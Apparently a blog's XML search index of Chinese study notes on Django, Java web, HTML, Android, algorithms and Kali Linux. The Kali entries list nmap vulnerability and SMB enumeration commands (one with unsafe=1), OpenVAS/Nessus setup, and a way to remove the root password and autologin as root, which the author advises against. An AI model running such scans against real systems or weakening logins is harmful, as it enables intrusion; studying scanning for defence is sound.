&#125;&lt;p&gt;it is a true part.&lt;/p&gt;&#123;% else%&#125;&lt;p&gt;it is a false part.&lt;/p&gt;&#123;% endif%&#125; 使用模板那系统渲染网站页面实现文章详情页面跳转设计文章详情页的URL12345/blog/detail=&gt;不能指定某一篇博客·/blog/detail/1=&gt;博客唯一ID为1的文章·/blog/detail/2=&gt;博客唯一ID为2的文章·/blog/detail/3=&gt;博客唯一ID为3的文章·/blog/detail/.. 实现首页的跳转就是完善视图函数 实现上下篇文章跳转文章下面添加两个按钮 上一篇 下一篇 实现分页功能]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Django</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简易导航]]></title>
    <url>%2F%E7%AE%80%E6%98%93%E5%AF%BC%E8%88%AA%2F</url>
    <content type="text"><![CDATA[博客论坛工具 CTF博客论坛平台网络信息安全攻防学习平台：(HawkEye鹰眼系统 付费)合天网安实验实验吧角斗场赛宁网安 工具CTFtools 一次性邮箱 一次性邮箱]]></content>
      <categories>
        <category>导航</category>
      </categories>
      <tags>
        <tag>导航</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派安装kali-linux]]></title>
    <url>%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali-linux%2F</url>
    <content type="text"><![CDATA[准备：1.树莓派2.一张16G以上的SD卡 3.树莓派的镜像（https://www.offensive-security.com/kali-linux-arm-images/） 4.解压.xz格式的镜像，解压成.img，并用烧录软件Win32 Disk Imager烧录到SD卡 5.插卡，接线，开机，输入账号密码root toor，进入kali桌面 连接网络：1.通过双绞线链接电脑，电脑连接wifi，电脑wifi网络要共享。2.通过双绞线和PC机器连接同一个路由器3.装备齐全的的条件下，通过键盘鼠标操作，连接wifi与PC机器在同一个局域网下。 安装汉语相关配置背景树莓派安装了 Kali 系统之后，所有的中文都显示为了乱码，就连打开浏览器之后上面的问题也都是乱码了。懒人不上图了。 步骤1.首先设置 Kali 的更新源： vi /etc/apt/sources.list 针对这种操作，我喜欢在Xshell+Winscp 修改文件内容，很少在vi下，在命令行下推荐vim #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 2.刷新软件列表： sudo apt-get update 3.安装中文字体 ： sudo apt-get install ttf-wqy-zenhei 4.下载完成之后输入 sudo dpkg-reconfigure locales 5.在这个界面把下面的三个选择上（按空格键选择）其余取消选择 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8 注意：table 键选择 ok6.然后选择zh_CN.UTF-8 7重启reboot重启之后就是中文界面了 安装中文输入法1.安装中文输入法 apt-get install fcitx 4.安装谷歌输入法 apt-get install fcitx-googlepinyin 5.安装完成后没有什么变化，重启一下 reboot 6.开机后就可以按住 ctrl 来回切换了（kali 2.0是按 ctrl+空格） 注：其他输入法 apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei #拼音五笔 apt-get install ibus ibus-pinyin #经典的ibus apt-get install fcitx fcitx-googlepinyin #fcitx拼音 更新安装完整输入法apt install kali-linux-all linux开机跳过输入用户名密码deepin国产系统设置中自带改功能，用起来很舒服，win也有这个功能，不想输入密码还不是因为懒，反正又没有小秘密，不怕看。步骤：1、省略密码验证 很简单，只需把/etc/passwd中的root:x:0:0:root:/root:/bin/bash，改为root::0:0:root:/root:/bin/bash，就可以了，就是去掉了里面的x，这样root用户就不用密码了。其他用户也一样。 体验感触：不舒服，还需要鼠标点一下登录，不然回车没反应。ssh连接凉了，无奈，不推荐偷懒，如果笔记本安装一个推荐或者树莓派安装了一个触摸屏也推荐。 (1)修改/etc/inittab 在inittab中，有如下配置 1:2345:respawn:/sbin/agetty tty 9600 我们只需将其修改为不执行agettty，而是执行自己编写的一个脚本，就可以跳过用户名和密码的输入。修改如下： 1:2345:respawn:/root/logintest tty 9600 这里我在/root/下放了一个测试脚本，这样系统启动时就会执行那个脚本，脚本内容： #!/bin/sh /bin/login -f root 脚本其实就是执行了一个root用户的登陆而已，如果有其他要求，也可以添加到脚本中。 体验：同上]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>kali-linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图床相关介绍]]></title>
    <url>%2F%E5%9B%BE%E5%BA%8A%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[腾讯云对象存储作为图床开发文档以及注册地址：https://cloud.tencent.com/document/product/436/6231?&amp;_ga=1.8271803.84925124.1514097780 具体操作很简单，不做赘述。 好工具COSBrowser:COS 桌面版工具，用户可以使用该工具进行可视化、方便的数据上传、下载等操作。 参考链接：https://blog.csdn.net/a201577f0546/article/details/80146350 其他图床 新浪微博 Github 七牛云 简书]]></content>
      <categories>
        <category>图床</category>
      </categories>
      <tags>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习笔记-入门级]]></title>
    <url>%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8%E7%BA%A7%2F</url>
    <content type="text"><![CDATA[1.学习技巧–王争 边学边练，适度刷题 多问、多思考、多互动 打怪升级学习法比如，针对这个专栏，你就可以设立这样一个目标：每节课后的思考… 知识需要沉淀，不要想试图一下子掌握所有学习知识的过程是反复迭代、不断沉淀的过程，书读百遍其义自见。 2.时间复杂度思考3.空间复杂度思考总结一、什么是复杂度分析？1.数据结构和算法解决是“如何让计算机更快时间、更省空间的解决问题”。2.因此需从执行时间和占用空间两个维度来评估数据结构和算法的性能。3.分别用时间复杂度和空间复杂度两个概念来描述性能问题，二者统称为复杂度。4.复杂度描述的是算法执行时间（或占用空间）与数据规模的增长关系。 二、为什么要进行复杂度分析？1.和性能测试相比，复杂度分析有不依赖执行环境、成本低、效率高、易操作、指导性强的特点。2.掌握复杂度分析，将能编写出性能更优的代码，有利于降低系统开发和维护成本。 三、如何进行复杂度分析？1.大O表示法1）来源算法的执行时间与每行代码的执行次数成正比，用T(n) = O(f(n))表示，其中T(n)表示算法执行总时间，f(n)表示每行代码执行总次数，而n往往表示数据的规模。2）特点以时间复杂度为例，由于时间复杂度描述的是算法执行时间与数据规模的增长变化趋势，所以常量阶、低阶以及系数实际上对这种增长趋势不产决定性影响，所以在做时间复杂度分析时忽略这些项。 2.复杂度分析法则1）单段代码看高频：比如循环。2）多段代码取最大：比如一段代码中有单循环和多重循环，那么取多重循环的复杂度。3）嵌套代码求乘积：比如递归、多重循环等4）多个规模求加法：比如方法有两个参数控制两个循环的次数，那么这时就取二者复杂度相加。 四、常用的复杂度级别？多项式阶：随着数据规模的增长，算法的执行时间和空间占用，按照多项式的比例增长。包括，O(1)（常数阶）、O(logn)（对数阶）、O(n)（线性阶）、O(nlogn)（线性对数阶）、O(n^2)（平方阶）、O(n^3)（立方阶）非多项式阶：随着数据规模的增长，算法的执行时间和空间占用暴增，这类算法性能极差。包括，O(2^n)（指数阶）、O(n!)（阶乘阶） 五、如何掌握好复杂度分析方法？复杂度分析关键在于多练，所谓孰能生巧。 4.数据结构与算法思考算法就是操作数据的一组方法。数据结构就是一组数据的存储结构。二者关系：数据结构是为算法服务的，算法要作用于特定的数据结构之上。数据结构是静态的，必须基于它操作和构建算法，数据结构才有意义。 数据结构三要素：数据逻辑结构、数据存储结构和数据的运算。 从广义和狭义两个层面理解数据结构与算法 1.广义：数据结构是指一组数据的存储结构。算法是操作数据的一组方法i. 引入图书馆找书的例子 2.狭义：指出专栏主要讲解著名的数据结构和算法，队列，栈，二分查找，动态规划等。经典的算法可以高效的帮我们解决实际开发问题 3.引入，为什么数据结构和算法会放到一起数据结构是为算法服务的，算法要作用在特定的数据结构之上。数据结构是静态的，它只是组指数据的一种方式。如果不在它的基础上操作，构建算法，孤立存在的数据结构就没有用。 复杂度就是用来分析算法执行效率与数据规模之间增长关系。 性能测试与复杂度分析不冲突，原因如下：1、性能测试是依附于具体的环境，如SIT、UAT机器配置及实例数量不一致结果也有差别。2、复杂度分析是独立于环境的，可以大致估算出程序所执行的效率。3、将复杂度熟记于心，能够写出更高效率、更好性能的代码。若某接口通过性能测试，达不到预期，还可以用复杂度分析接口代码，找出最影响性能的代码，进行优化。 每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？这个问题分两种情况讨论1、开发过程中，码代码的过程中就能得出其复杂度，这并不会太多的浪费时间，同时只有分析了每段代码的复杂度，才能估算出它们的执行效率。2、优化代码时，只有在分析每段代码的复杂度后，才能定位问题代码，才能做相应优化]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali-linux漏洞扫描入门]]></title>
    <url>%2FKali-linux%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[发现漏洞 基于端口服务扫描结果版本信息（速度慢） 搜索已公开的漏洞数据库（数量大） 使用弱点扫描器实现漏洞管理 从信息的维度定义漏洞管理信息收集： 扫描发现网络IP、OS、服务、配置、漏洞 能力需求：定义扫描方式内容和目标信息管理 格式化信息，并进行筛选、分组、定义优先级 能力需求：资产分组、指定所有者、向所有者报告漏洞信息输出 向不同层级的人群展示足够的信息量 能力需求：生成报告、导出数据、与SIEM集成 弱点扫描类型主动扫描 有身份验证 无身份验证被动扫描 镜像端口抓包 其他来源输入基于Agent的扫描 支持平台有限 漏洞基本概念CVSS（Common Vulnerability Scoring System） 通用漏洞评分系统——工业标准 描述安全漏洞严重程度的统一评分方案 V 3版本——2015年6月10日 Basic Metric：基础的恒定不变的弱点权重 Temporal Metric：依赖时间因素的弱点权重 Enviromental Metric：利用弱点的环境要求和实施难度的权重CVSS是安全内容自动化协议（SCAP）的一部分 通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新 分值范围：0 —— 10 不同机构按CVSS分值定义威胁的中、高、低威胁级别 CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度 CVSS分值是工业标准，但威胁级别不是Vulnerability ReferenceCVE（ Common Vulnerabilities and Exposures ） 已公开的信息安全漏洞字典，统一的漏洞编号标准 MITRE公司负责维护（非盈利机构） 扫描器的大部分扫描项都对应一个CVE编号 实现不同厂商之间信息交换的统一标准 CVE发布流程 发现漏洞 CAN负责指定CVE ID 发布到CVE List —— CVE-2008-4250 MITRE负责对内容进行编辑维护 很多厂商维护自己的Vulnerability Reference MS –微软 MSKB – 补丁 其他Vulnerability Reference CERT TA08-297A BID 31874 IAVM 2008-A-0081 OVAL OVAL6093 OVAL（Open Vulnerability and Assessment Language） 描述漏洞检测方法的机器可识别语言 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作 OVAL使用XML语言描述，包含了严密的语法逻辑CCE 描述软件配置缺陷的一种标准化格式 在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。CPE（Common Product Enumeration） 信息技术产品、系统、软件包的结构化命名规范，分类命名CWE（Common Weakness Enumeration） 常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）Security Content Automation Protocol (SCAP) SCAP 是一个集合了多种安全标准框架 六个元素：CVE、OVAL、CCE、CPE、 CVSS、XCCDF 目的是以标准的方法展示和操作安全数据 由NIST负责维护 SCAP主要解决三个问题 实现高层政策法规等到底层实施的落地（如FISMA，ISO27000系列） 将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量） 将复杂的系统配置核查工作自动化 SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安全行业产生了深远的影响。 NVD（National Vulnerability Database） 美国政府的漏洞管理标准数据 完全基于SCAP框架 实现自动化漏洞管理、安全测量、合规要求 包含以下库 安全检查列表 软件安全漏洞 配置错误 产品名称 影响度量 https://nvd.nist.gov/ NMAP nmap 扫描脚本 400+ 分类 cat /usr/share/nmap/scripts/script.db grep vuln /usr/share/nmap/scripts/script.db| cut -d “\”” -f 2 cat /usr/share/nmap/scripts/smb-check-vulns.nse smb-check-vulns.nse nmap -sU -sS –script=smb-check-vulns.nse –script-args=unsafe=1 -p U:137,T:139,445 1.1.1.1 MS08-067smb-vuln-ms10-061.nse Stuxnet蠕虫利用的4个漏洞之一 Print Spooler权限不当，打印请求可在系统目录可创建文件、执行任意代码 LANMAN API枚举共享打印机 远程共享打印机名称 smb-enum-shares枚举共享 身份认证参数——smbuser、smbpassword nmap -p445 –script=smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass1.1.1.1 Windows XP,Server 2003 SP2,Vista,Server 2008, win 7其他资料收集 简介：NMap也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。 中文手册 链接 英文手册 链接 优秀博客： nmap命令—–基础用法 nmap命令—–高级用法 OPENVAS相关OpenVAS 是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。 用户需要一种自动测试的方法，并确保正在运行一种最恰当的最新测试。OpenVAS 包括一个中央服务器和一个图形化的前端。这个服务器准许用户运行 几种不同的网络漏洞测试（以 Nessus 攻击脚本语言编写），而且 OpenVAS 可以经常对其进行更新。OpenVAS 所有的代码都符合 GPL 规范。 构造图： 介绍OpenVAS Manager 控制scanner和其他manager的中心组件 控制中心数据库，保存用户配置及扫描结果 客户端使用基于XML的无状态OMP协议与其通信 集中排序筛选，使客户端获得一致展现OpenVAS Scanner 具体执行Network Vulnerability Tests （NVTs） NVTs 每天通过 Feed 更新 受 Manager 控制OSP Scanner 可以统一管理多个scanner 将一组 scanner 作为一个对象交给manager管理Greenbone Security Assistant (GSA) 提供 Web serviceOpenVAS CLI omp 命令行工具，可实现批处理控制 manager更新很快 所有找得到的资料几乎都已不同程度的过时了 使用步骤安装 初始化安装 openvas-setup 检查安装结果 openvas-check-setup 查看当前账号 openvasmd–list-users 修改账号密码 openvasmd–user=admin –new-password=Passw0rd 升级 openvas-feed-update创建证书同步弱点数据库创建客户端证书重建数据库备份数据库启动服务装入插件创建管理员账号创建普通用户账号配置服务侦听端口安装验证 NESSUS 家庭版 免费 专业版 收费、无限的并发连接1.下载 http://www.tenable.com/products/nessus/select-your-operating-system2.安装 dpkg –i 安装路径： /opt/nessus3.启动服务 /etc/init.d/nessusd start4.管理地址 https://127.0.0.1:88345.注册激活码 http://www.tenable.com/products/nessus-home6.管理账号 更新插件7.基本配置（setting） 升级 账号 SMTP 代理8.实战 策略 扫描 扫描本机 扫描windows 扫描linux 扫描网络设备 扫描web server 报告 调度 openvas、nessus实战笔记好教程大学霸 Kali Linux 安全渗透教程：https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/28.html 个人笔记nessus 版本分linux和win，在linux版本中针对不同内核、不同处理器，版本也各部相同。首次使用注意保存启动命令方式。（见上文）创建目标主机，步骤很简单，很容易上手。扫描之前创建一个靶机，用于漏洞扫描，靶机推荐 Metasploitable 操作系统，该操作系统存在大量未修补漏洞。实战：扫描了虚拟机的靶机和自己的两台服务器，效果明显，针对高版本服务器，漏洞的出现率非常低。 openvas 一直出现404错误，原因不知。尝试了下，可以用，体验不是太好。提供ssh与不提供ssh效果明显不同。 用到的链接：Linux安装Nessus的详细操作win下的Nessus漏洞扫描教程之配置Nessus 漏洞的处理：如何关闭http Methods中的Trace 提高安全意识]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>kali</tag>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java-web-会话及其会话技术]]></title>
    <url>%2Fjava-web-%E4%BC%9A%E8%AF%9D%E5%8F%8A%E5%85%B6%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[1.会话概述： 什么是会话：从打开浏览器，到访问网页，到最终关闭浏览器，整个过程就是一次会话。 会话的特点：包含多个请求，一次完整的会话针对一个用户。会话管理技术：第一种：cookie技术，客户端技术。第二种：session技术，服务端技术。购物车案列：买完商品后，加入购入车，买的商品存到什么对象比较合适？ 1.使用request域对象保存商品信息：结论：使用request保存商品信息不可以，因为每次发送请求，都会产生一个新的请求对象。 2.使用ServletContext域对象保存商品信息结论：使用Servletcontext对象保存商品信息，可以，但是不合理。所以在开发中，保存会话过程中产生的数据，采用会话管理技术，也就是使用cookie和session技术来保存会话过程产生的数据。 2.Cookie对象1.1什么是cookie：Cookie是一种会话管理技术，它是用来保存会话过程中产生的数据，然后在浏览器和服务器交互时，会使用cookie里面保存的数据注意：首次访问服务器，浏览器不会携带cookie到服务端。 1.2Cookie常用的api 1.得到cookie对象：Cookie cookie=new Cookie（String key，String value）； 2.回写（响应）cookie到浏览器端：response.addCookie（cookie）； 3.得到cookie的名称：String key=cookie.getName（），得到cookie的值：String value=cookie.getValue（）； 4.给cookie设置生命时长：setMaxAge（int sr）；比如：cookie.setMaxAge（606024*7），说明cookie能存活7天；cookie分类：第一类：会话级别cookie，浏览器关闭，cookie对象就销毁了。第二类：持久化cookie，通过setMaxAge这个方法来设置。 5.给cookie设置路径，设置域名：setPath（路径的ur1），setDomain（域名）；I比如：域名就是服务器名称，比如说：www.baidu.com 6.得到cookie:Cookie[]cookies=request.getCookies（） 3.Session对象1.1什么是sessionsession是一种会话管理技术，session用来保存会话过程中的数据，保存的数据存储到服务器端。session原理：基于cookie实现的，更确切的说是基于会话级别的cookie实现的。 1.2 HttpSession API session常用方法： 1.得到session的id（JESSIONID对应的值）：getId（）； 2.设置session的生命时长：setMaxInactiveInterval（int interval） 3.销毁session:invalidate（）；得到session:HttpSession session=getSession（）；session域对象：作用范围一次完整的会话（包含多个请求） 1.存值：setAttribute（String key，Object obj）；&gt;&gt;&gt;2.取值：Object obj=getAttribute（String key）； 3.移除：|removeAttribute（String key）f总结域对象：request域对象 session域对象 servletcontext域对象，作用范围以次变大。 1.3 Session超时管理session对象是由生命时长，它的默认存活时间是30分钟。具体配置找tomcat软件的conf下的web.xml文件立即销毁session对象：invalidate（）；]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>会话</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java-web之面向百度编程笔记]]></title>
    <url>%2Fjava-web%E4%B9%8B%E9%9D%A2%E5%90%91%E7%99%BE%E5%BA%A6%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[java杂项 由equals的源码可以看出这里定义的equals与= =是等效的（Object类中的equals没什么区别），不同的原因就在于有些类（像String、Integer等类）对equals进行了重写，但是没有对equals进行重写的类（比如我们自己写的类）就只能从Object类中继承equals方法，其equals方法与= =就也是等效的，除非我们在此类中重写equals。另外，= =比equals运行速度快,因为= =只是比较引用。 request和response(请求和响应) 当Web容器收到客户端的发送过来http请求，会针对每一次请求，分别创建一个用于代表此次请求的HttpServletRequest对象(request)对象、和代表响应的HTTPServletResponse对象(response)。 request负责获取客户机提交过来的数据。 response负责向客户机输出数据。 eclipse publish:是将你的web程序发布到tomcat服务器上，这样通过浏览器就可以访问你的程序。 clean：是指原先编译到tomcat服务器上的程序，先清除掉，然后再重新编译。 IDEAHtml “&amp;nbsp”什么意思：在 html 里是空格占位符，普通的空格在 html 里如果连续的多个可能被认为只有一个，而这个东西你写几个就能占几个空格位 javascripcss]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习笔记]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[html简介它是一门描述网页的语言，HyperText MarkUp Language，超文本标记语言。 超文本：超出文本的范畴，指的在网页上面可以描述文本、图片、视频等内容 标记：标签，在标签里面书写内容。 语言：html就是用户和浏览器交互的工具，简单来讲，浏览器会解析htm1的标记，以特定的效果给展示出来htm1的主要组成部分： 文档的声明&lt;！DOCTYPE&gt;：声明了html的类型和版本号 htm1的根标记：标识htm1的开始和结束 htm1的头部标记：设置与页面相关的信息 htm1的主体标记：在页面展示内容。 html文件必须以开始，以结束html语法不区分大小写htm1有结束标记，比如内容，htm1的标记如果没有结束标记，自己结束。比如html作用：它用来编写网页，在网页通过html标记来描述文本、图片、视频等内容 单标记和双标记 1.单标记：空标记，就是没有结束标记的称之为单标记。语法： 2.双标记：体标记，就是这个标记有开始和结束。语法：内容 文本样式标记内容常用的属性：face用来描述字体的样式size用来描述字体的大小，最大取值为7color用来描述字体的颜色，取值三种形式：用英文单词表示：red，green，blue 用16进制的数据表示：#ff0000*用rgb三原色表示：rgb（255，255，0） 其它标记：标题标记：，—–字体样式标记：，， 图像标记：图像标记：在网页上引入图片语法：&lt;img src=“图像的url”/&gt;常用的属性：src用来引入图片width 描述图片的宽度height 用来描述图片的高度border用来描述图片的边框注意：图片的路径分为绝对路径和相对路径（同级目录，上级目录，下级目录）注释标记：&lt;！–图像标记–&gt;，注释标记的内容不会显示在网页上面。PS: htm1描述网页的语言，并不是很严谨的语言，html标记通过被浏览器解析，展示特定的效果。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java-web 之请求与响应学习]]></title>
    <url>%2Fjava-web-%E4%B9%8B%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[HttpServletResponse是一个接口，它的父接口是ServletResponse，在开发中通常使用HttpServletResponse响应信息分为三部分：响应行、响应头、响应正文（响应体） 1.1发送状态码的相关方法：1.设置状态码setStatus（int sc）：参数就是状态码。setstatus（int sc，String sm）：第一个参数表示状态码，第二个参数就状态码的描述。 常见的状态码：200响应成功302重定向404请求资源找不到500服务器代码出异常。 2.错误信息方法：sendError（int sc）：参数状态码sendError（int sc，String sm）：第一个参数表示状态码，第二个参数就状态码的描述。 1.2发送响应消息头相关的方法：响应消息头的数据格式：key-value的形式，有的是一个key，一个value，有的是一个key，多个value 1.设置响应消息头： 一个key，一个valuesetHeader（String key，String value）； 一个key，对应多个valueaddHeader（String key，String value）； 2.设置响应数据的长度：setContentLength（int src）方法3.设置处理乱码的方法： setCharacterEncoding（String a）；参数就是一个码表格式，比如：“utf-81 setContentType（String a）；参数代表响应数据的类型和码表格式，比如：“text/html；charset=utf-8” 结论：在处理字符流和字节流输出中文乱码时，都采用response.setContentType（注意：常见的编码格式：GBKGB18030GB2312都是支持中文的编码格式，当然支持其它一些字符。UTF-8：万能码表格式，支持所有的字符。ISO-8859-1：不支持中文。 1.3.HttpServletRequest请求对象HttpServletRequest它是一个接口，它的父接口ServletRequest，在开发中，常用的是带协议的请求对象。请求消息：请求行，请求头，请求参数。 1.获取请求行消息的相关方法：常用的请求行方法： 1.获取请求提交的方式：getMethod（）；&gt;&gt;&gt;2.获取请求的协议：getProtocol（）； 3.获取项目名称：getcontextPath（）； 4.获取servlet路径：getServletPath（）； 5.获取请求路径：getRequsetuRI（），getRequestURL（）2.获取请求消息头相关的方法 1.根据消息头，获取值：String value=getHeader（消息头的名称）； 2.获取所有的消息头：Enumeration er=getHeaderNames（）；根据Referer请求消息头，做一个防盗链的案例： 难点：怎么判断这个发起的下载请求是从别的网站上发起的？解决方法：根据Referer请求头对应的值，是否包含了服务器的名称如果包含，就说明是从本网站下载的，否则就不是。3.获取请求参数相关的方法： 1.根据name属性值，获取用户输入的值：string value=getParameter（name属性对应的值）； 2.根据name属性值，获取用户选择的值：String[]vaules=getParameterValues（name属性对应的值）； 3.没有参数，获取所有值：Map&lt;String，String[]&gt;map=getParameterMap（）；4.解请求参数的中文乱码问题：中文乱码处理分两种情况： 第一种情况：处理get方式提交的中文乱码使用的String的构造方法解决的中文乱码：new String（字节数组，编码格式）；代码：String nevalue=new String（value.getBytes（”IS08859-1”），”utf-8”）； 第二种情况：处理post请求的中文乱码问题：post提交，会把参数首先提交到request对象的缓冲区中，缓冲区默认编码是IS08859-1，不支持中文处理方法：把request缓冲区的编码给设置成支持中文的码表格式。代码：request.setCharacterEncoding（”utf-8”）； 5.通过Requset对象传递数据什么域对象：在一定的范围内，可以存值和取值。request域对象：在一次请求中，可以存值和取值。 存值：setAttribute（String key，Object obj）；&gt;&gt;&gt;取值：Object obj=getAttribyte（String key）； 移除：removeAttribute（String key）；1.4 RequestDispatcher接口在开发中访问到一个web资源后，需要服务器跳转到另一个资源去处理请求，可以通过sendRedirect重定向方法来实现，也可以RequestDispatcher转发对象的forward方法来实现。得到转发对象：RequestDispatcher forwardobj=request.getRequestDispatcher（”另一个资源的路径”）；常用方法： 1.实现请求转发：forwardObj.forward（request，response）； 2.实现请求包含：forwardobj.include（request，response）； 1.请求转发：特点：发送了一次请求，响应一次，和request域对象配合使用，可以实现值得传递。转发路径：转发动作是在服务器内部实现的，所以转发路径不要携带项目名称。 2.请求重定向：特点：发送了两次请求，响应了两次，不能喝request域对象配合使用。重定向路径：重定向动作在浏览器端执行的，所以路径需要携带项目名称。 2.请求包含：特点：发送一次请求，请求包含是由服务器完成。请求包含路径：在服务器内部完成的，路径不需要携带项目名称。]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>请求与相应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓从入门到放弃]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%2F</url>
    <content type="text"><![CDATA[Android studio 设置问题1、字体的调整 布局 android:orientation “vertical” ：垂直显示 “horizontal” ：水平显示 “match_parent”：是根据容器内的东西决定组件的大小，比如一个按钮，按钮中的字体大，那么这个按钮就大，字体小那么相应的按钮就会小些。“wrap_parent”：是指“填充满”父容器。但是他跟fill_parent是不一样的，fill是真的填满，没有条件。而match的话有自动调整的功能。 相对布局margin：marginBottom：当前控件底边界与某控件之间的距离marginEnd：marginTop：marginHorizontal：marginLeft：当前控件左边界与某控件之间的距离marginRight：当前控件右边界与某控件之间的距离marginStartmarginVertical centerlnParent：设置当前控件位于父布局的中央位置 centerVertical：设置当前控件位于父布局的垂直居中位置 centerHorizontal：设置当前控件位于父布局的水平居中位置 above：设置当前控件位于某控件上方 below：设置当前控件位于某控件下方 toLeftOf： 设置当前控件位于某控件左侧 toRightOf： 设置当前控件位于某控件右侧 alignParentTop： 设置当前控件是否与父控件顶端对齐 alignParentLeft： 设置当前控件是否与父控件左对齐 alignParentRight： 设置当前控件是否与父控件右对齐 alignParentBottom： 设置当前控件是否与父控件底端对齐 align Top： 设置当前控件的上边界与某控件的上边界对齐 align.otom： 设置当前控件的下边界与某控件的下边界对齐 alignLeft： 设置当前控件的左边界与某控件的左边界对齐 algnRight： 设置当前控件的右边界与某控件的右边界对齐 padding：设置四周内边距的距离paddingBottom：设置布局底部内边距的距离paddingEnd：paddingHorizontal：paddingLeft：设置布局左边内边距的距离paddingRight：设置布局右边内边距的距离paddingStart：paddingTop：设置布局顶部内边距的距离paddingVertical： 帧布局：foreground：设置帧布局的前景图像foregroundGravity：设置前景图像显示位置]]></content>
      <categories>
        <category>安卓</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习Servlet]]></title>
    <url>%2F%E5%AD%A6%E4%B9%A0Servlet%2F</url>
    <content type="text"><![CDATA[Servlet的入门1.Servlet的接口和实现类：Servlet它是一个接口，在javax.servlet 包下面。 五个方法： destory（）：执行这个方法，销毁了servlet对象 init（ServletConfig config）：在web服务器创建servlet对象以后，执行这个初始化方法。 service（ServletRequest req，ServletResponse res）：服务方法，用来接收客户端发送的请求，并且响应数据到 getServletConfig（）：现在不讲 getServletInfo（）：servlet的信息，比如作者、版本和版权，这个方法在开发中不用。Genericservlet，它是一个类，实现了Servlet接口Httpservlet，它是一个类，实现了Servlet接口，同时继承了GenerciServlet创建servlet三种方式 直接实现Servlet接口。 继承HttpServlet类。 一般在开发中，创建servlet，通常去继承这个HttpServlet.比如：class MyServlet extends HttpServlet{重写咱们所需要的方法} Servlet的生命周期：生命周期：自然界人从出生到最终走向西方极乐世界，这个周期过程就是生命周期，其实servlet的生命周期和人的一样，从servlet对象被创建，经过使用servlet对象，到最终servlet对象被销毁，整个过程就是servlet的生命周期。 与生命周期相关的三个方法： init（ServletConfig config）初始化方法：首次访问这个Servlet，servlet对象会被创建，执行初始化方法。 service（ServletRequest req，ServletResponse res）服务方法：每次访问servlet时，服务方法都会被执行。 destroy（）销毁方法：在服务器正常关闭时。会执行销毁方法，执行一次。 Servlet应用-HttpServlet 在开发中，通常浏览器访问web服务器端的资源，是带有协议的访问，比如说http协议、https协议等，所以说在创建servlet时。需要使用带有协议的servlet，那么咱们程序员在创建servlet时，通常用继承HttpServlet的方式来实现。 1.查看HttpServlet源码得到的结论：在HttpServlet里面重写service方法时，因为在service方法里面，最终调用doGet或者doPost方法，所以说在重写服务方法时，一般情况下不会重写service方法，而是直接重写doGet和doPost方法在客户端发送get请求，在服务器端就用doGet方法接收、在客户端发送Post请求，在服务器端就用doPost方法来接收 在开发中，注意的细节： 